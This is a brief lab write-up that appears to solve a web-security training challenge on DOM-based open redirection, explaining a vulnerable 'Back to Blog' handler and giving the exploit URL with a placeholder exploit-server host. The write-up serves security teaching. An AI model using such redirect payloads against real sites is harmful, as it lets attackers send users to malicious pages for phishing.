# Lab: DOM-based open redirection (Practitioner)

**Goal:** Redirect the victim to the exploit server.

## Vulnerability
The “Back to Blog” link parses `location` with a regex for `url=` and sets `location.href` to the captured value — classic DOM open redirect.

## Solution

Visit (or send the victim to):

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
```

### Steps
1. Open a blog post and inspect the “Back to Blog” onclick handler.
2. Supply a full URL in the `url` parameter pointing at your exploit server.
3. When the link logic runs (or the page processes the parameter), the browser redirects.

## Final Exploit URL
```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
```
